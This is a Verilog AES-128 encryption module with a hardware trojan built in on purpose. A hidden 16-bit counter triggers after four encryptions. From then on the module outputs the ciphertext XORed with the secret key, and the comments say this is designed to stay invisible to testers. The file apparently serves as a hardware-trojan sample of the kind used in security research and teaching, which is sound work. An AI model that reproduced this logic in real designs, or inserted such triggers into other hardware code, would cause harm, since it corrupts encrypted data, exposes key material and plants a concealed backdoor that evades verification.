module aes_top (
    input clk,
    input reset,
    input start,
    input [127:0] plaintext,
    input [127:0] key,
    output [127:0] ciphertext,  // Removed 'reg' to drive continuously 
    output reg done
);
    reg [3:0] round_count;
    reg [127:0] state;
    reg [127:0] current_key;
    
    // Internal register to hold the clean AES result
    reg [127:0] clean_ciphertext; 

    wire [127:0] next_key;
    wire [127:0] round_out;
    wire [127:0] sub_bytes_out;
    wire [127:0] shift_rows_out;

    aes_key_expand ke (.old_key(current_key), .round(round_count), .new_key(next_key));
    aes_round ar (.state_in(state), .round_key(next_key), .state_out(round_out));

    genvar i;
    generate
        for (i = 0; i < 16; i = i + 1) begin : sbox_final
            aes_sbox sb_f (.sbox_in(state[i*8+7:i*8]), .sbox_out(sub_bytes_out[i*8+7:i*8]));
        end
    endgenerate

    // Final Round ShiftRows Mapping (Synchronized Big-Endian)
    // Row 0: No shift
    assign shift_rows_out[127:120] = sub_bytes_out[127:120];
    assign shift_rows_out[95:88]   = sub_bytes_out[95:88];
    assign shift_rows_out[63:56]   = sub_bytes_out[63:56];
    assign shift_rows_out[31:24]   = sub_bytes_out[31:24];

    // Row 1: Shift left by 1
    assign shift_rows_out[119:112] = sub_bytes_out[87:80];
    assign shift_rows_out[87:80]   = sub_bytes_out[55:48];
    assign shift_rows_out[55:48]   = sub_bytes_out[23:16];
    assign shift_rows_out[23:16]   = sub_bytes_out[119:112];

    // Row 2: Shift left by 2
    assign shift_rows_out[111:104] = sub_bytes_out[47:40];
    assign shift_rows_out[79:72]   = sub_bytes_out[15:8];
    assign shift_rows_out[47:40]   = sub_bytes_out[111:104];
    assign shift_rows_out[15:8]    = sub_bytes_out[79:72];

    // Row 3: Shift left by 3
    assign shift_rows_out[103:96]  = sub_bytes_out[7:0];
    assign shift_rows_out[71:64]   = sub_bytes_out[103:96];
    assign shift_rows_out[39:32]   = sub_bytes_out[71:64];
    assign shift_rows_out[7:0]     = sub_bytes_out[39:32];

    always @(posedge clk or posedge reset) begin
        if (reset) begin
            round_count <= 4'h0;
            done <= 1'b0;
        end else if (start && round_count == 0) begin
            state <= plaintext ^ key;
            current_key <= key;
            round_count <= 4'h1;
            done <= 1'b0;
        end else if (round_count >= 1 && round_count < 10) begin
            state <= round_out;
            current_key <= next_key;
            round_count <= round_count + 1;
        end else if (round_count == 10) begin
            clean_ciphertext <= shift_rows_out ^ next_key; // Saved to internal reg
            done <= 1'b1;
            round_count <= 4'h0;
        end
    end

    // ====================================================================
    // THE RARE TRIGGER (THE TIMEBOMB)
    // ====================================================================
    // A 16-bit register to silently count how many encryptions have happened.
    reg [15:0] encryption_count;

    always @(posedge clk or posedge reset) begin
        if (reset) begin
            encryption_count <= 16'd0;
        end else if (round_count == 10) begin
            // Increment the counter every time an encryption successfully finishes
            encryption_count <= encryption_count + 16'd1;
        end
    end

    // The Trojan detonates ONLY after 4 successful encryptions. 
    wire trojan_triggered = (encryption_count >= 16'd4);

    // ====================================================================
    // THE PAYLOAD
    // ====================================================================
    // If triggered = 1: Drive the corrupted data (clean_ciphertext XOR key) to the pins
    // If triggered = 0: Drive the clean data to the pins (invisible to testers)
    assign ciphertext = trojan_triggered ? (clean_ciphertext ^ key) : clean_ciphertext;
    
endmodule